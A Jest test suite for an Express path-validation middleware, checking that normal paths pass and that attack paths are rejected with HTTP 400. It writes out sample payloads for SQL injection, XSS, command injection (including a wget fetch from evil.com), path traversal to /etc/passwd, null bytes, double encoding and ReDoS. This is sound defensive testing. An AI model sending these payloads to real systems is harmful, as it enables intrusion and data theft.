import { Request, Response, NextFunction } from 'express';
import { pathValidationMiddleware } from './path-validation-middleware';

describe('Path Validation Middleware', () => {
    let mockRes: Partial<Response>;
    let nextFunction: NextFunction;
    let sendSpy: jest.Mock;
    let statusSpy: jest.Mock;

    const createMockReq = (path: string): Partial<Request> => ({
        path,
        ip: '127.0.0.1',
        method: 'GET',
    });

    beforeEach(() => {
        sendSpy = jest.fn();
        statusSpy = jest.fn().mockReturnValue({ send: sendSpy });
        mockRes = {
            status: statusSpy,
        };
        nextFunction = jest.fn();
    });

    describe('Valid paths', () => {
        test('should allow normal path', () => {
            const mockReq = createMockReq('/some/normal/path');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(nextFunction).toHaveBeenCalled();
            expect(statusSpy).not.toHaveBeenCalled();
        });

        test('should allow UUID', () => {
            const mockReq = createMockReq('/123e4567-e89b-12d3-a456-426614174000');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(nextFunction).toHaveBeenCalled();
        });

        test('should allow Norwegian characters', () => {
            const mockReq = createMockReq('/æøå/test');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(nextFunction).toHaveBeenCalled();
        });

        test('should allow valid XP image path with file', () => {
            const mockReq = createMockReq('/_/image/123/file.jpg');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(nextFunction).toHaveBeenCalled();
        });

        test('should allow valid XP attachment path with file', () => {
            const mockReq = createMockReq('/_/attachment/inline/123/file.pdf');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(nextFunction).toHaveBeenCalled();
        });
    });

    describe('Blocked Enonic XP root paths', () => {
        test('should block /_/image root path', () => {
            const mockReq = createMockReq('/_/image');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/image/ root path with trailing slash', () => {
            const mockReq = createMockReq('/_/image/');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/attachment root path', () => {
            const mockReq = createMockReq('/_/attachment');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/attachment/ root path with trailing slash', () => {
            const mockReq = createMockReq('/_/attachment/');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block /_/component root path', () => {
            const mockReq = createMockReq('/_/component');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });
    });

    describe('SQL Injection attempts', () => {
        test('should block SQL injection with single quote', () => {
            const mockReq = createMockReq("/test' OR '1'='1");
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
            expect(nextFunction).not.toHaveBeenCalled();
        });

        test('should block SQL comment injection', () => {
            const mockReq = createMockReq('/test--comment');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block UNION SELECT', () => {
            const mockReq = createMockReq('/test union select');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block encoded SQL injection', () => {
            const mockReq = createMockReq('/test%27%20OR%201=1');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('XSS attempts', () => {
        test('should block script tag', () => {
            const mockReq = createMockReq('/<script>alert(1)</script>');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block encoded script tag', () => {
            const mockReq = createMockReq('/%3Cscript%3Ealert(1)%3C/script%3E');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block img tag with onerror', () => {
            const mockReq = createMockReq('/<img alt src="" onerror=alert(1)>');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('Command Injection attempts', () => {
        test('should block pipe character', () => {
            const mockReq = createMockReq('/test | ls');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block backtick', () => {
            const mockReq = createMockReq('/test`whoami`');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block shell command with arguments', () => {
            const mockReq = createMockReq('/wget http://evil.com/shell');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block curl command', () => {
            const mockReq = createMockReq('/curl -O malware');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('Path Traversal attempts', () => {
        test('should block directory traversal with ../', () => {
            const mockReq = createMockReq('/../etc/passwd');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block directory traversal with ..\\', () => {
            const mockReq = createMockReq('/..\\windows\\system32');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block access to /etc/passwd', () => {
            const mockReq = createMockReq('/etc/passwd');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('Malicious file extensions', () => {
        test('should block .php files', () => {
            const mockReq = createMockReq('/malicious.php');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block .exe files', () => {
            const mockReq = createMockReq('/malware.exe');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block .sh files', () => {
            const mockReq = createMockReq('/script.sh');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('DoS protection', () => {
        test('should block ReDoS exploit attempts efficiently', () => {
            // This path would cause exponential backtracking with vulnerable regex like /(.{10,})\1{3,}/
            // Pattern: equals sign followed by many characters without the expected closing delimiter
            const redosPayload = '/test=' + 'a'.repeat(500) + '!';

            const mockReq = createMockReq(redosPayload);
            const startTime = Date.now();
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            const duration = Date.now() - startTime;

            // Should complete in reasonable time (< 100ms) even with potentially malicious input
            expect(duration).toBeLessThan(100);
            // Should be blocked by repeated pattern check
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block ReDoS in union/select pattern efficiently', () => {
            // This would cause backtracking in /union.*select/i with many non-matching chars
            const redosPayload = '/union' + 'x'.repeat(500) + 'y';

            const mockReq = createMockReq(redosPayload);
            const startTime = Date.now();
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            const duration = Date.now() - startTime;

            expect(duration).toBeLessThan(100);
            // Should be blocked by repeated pattern check
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block ReDoS in XSS pattern with unclosed tag efficiently', () => {
            // Tests [^\n]+ patterns - opening tag without closing bracket
            const redosPayload = '/<img ' + 'x'.repeat(500);

            const mockReq = createMockReq(redosPayload);
            const startTime = Date.now();
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            const duration = Date.now() - startTime;

            expect(duration).toBeLessThan(100);
            // Should be blocked by repeated pattern check
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block ReDoS in SQL pattern with many word chars efficiently', () => {
            // Tests \w* possessive quantifier pattern
            const redosPayload = '/' + 'a'.repeat(500) + "'or";

            const mockReq = createMockReq(redosPayload);
            const startTime = Date.now();
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            const duration = Date.now() - startTime;

            expect(duration).toBeLessThan(100);
            // Should be blocked by SQL injection pattern
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block excessively long paths', () => {
            const mockReq = createMockReq('/' + 'a'.repeat(2001));
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block repeated pattern attacks', () => {
            const mockReq = createMockReq('/aaaaaaaaaaaaaaaaaaaaaaaaa'.repeat(10));
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block excessive path segments', () => {
            const mockReq = createMockReq('/' + Array(51).fill('segment').join('/'));
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('Null byte injection', () => {
        test('should block null byte in path', () => {
            const mockReq = createMockReq('/test\0malicious');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block encoded null byte', () => {
            const mockReq = createMockReq('/test%00malicious');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });

    describe('Double encoding attacks', () => {
        test('should block double-encoded single quote', () => {
            // %2527 decodes to %27, which matches our pattern /%27/
            const mockReq = createMockReq('/test%2527malicious');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });

        test('should block double-encoded script tag', () => {
            // %253C decodes to %3C, which matches our pattern /%3C/
            const mockReq = createMockReq('/%253Cscript%253E');
            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
            expect(statusSpy).toHaveBeenCalledWith(400);
        });
    });
});
